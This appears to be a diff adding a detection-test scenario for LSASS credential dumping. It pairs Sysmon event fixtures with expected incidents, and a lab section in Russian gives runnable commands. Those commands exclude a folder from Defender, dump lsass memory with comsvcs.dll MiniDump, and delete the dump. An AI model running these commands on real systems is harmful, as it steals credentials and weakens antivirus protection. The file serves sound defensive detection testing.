@@ -1,0 +1,28 @@
+scenario: SCE_Cred_LSASS_Dump
+cases:
+  - name: positive_comsvcs_minidump
+    expect_incidents: [cred_lsass_dump]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\rundll32.exe', OriginalFileName: RUNDLL32.EXE, CommandLine: 'rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\l.dmp full', ParentImage: 'C:\Windows\System32\cmd.exe', IntegrityLevel: High}
+      - at: 1
+        event: {EventID: 10, Channel: Microsoft-Windows-Sysmon/Operational, SourceImage: 'C:\Windows\System32\rundll32.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1fffff', CallTrace: 'C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\KERNELBASE.dll+2c13e|C:\Windows\System32\comsvcs.dll+2a2a1|UNKNOWN(0000021E4F3A1234)'}
+  - name: positive_procdump_lsass
+    expect_incidents: [cred_lsass_dump]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\procdump64.exe', CommandLine: 'procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\out.dmp', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: positive_dump_file_written
+    expect_incidents: [cred_lsass_dump]
+    events:
+      - event: {EventID: 11, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\Taskmgr.exe', TargetFilename: 'C:\Users\victim\AppData\Local\Temp\lsass.DMP'}
+  - name: negative_defender_accesses_lsass
+    expect_incidents: []
+    events:
+      - event: {EventID: 10, Channel: Microsoft-Windows-Sysmon/Operational, SourceImage: 'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MsMpEng.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1fffff', CallTrace: 'C:\Windows\SYSTEM32\ntdll.dll+9d204'}
+  - name: negative_procdump_other_process
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Tools\procdump64.exe', CommandLine: 'procdump64.exe -ma w3wp.exe C:\dumps\w3wp.dmp', ParentImage: 'C:\Windows\System32\cmd.exe'}
+lab:
+  - 'Defender заблокирует: сначала прогон с Defender (проверка SCE_Evasion_Defender_Tampering не нужна), затем Add-MpPreference -ExclusionPath C:\Users\Public'
+  - '$p=(Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\l.dmp full'
+  - 'Remove-Item C:\Users\Public\l.dmp -Force'
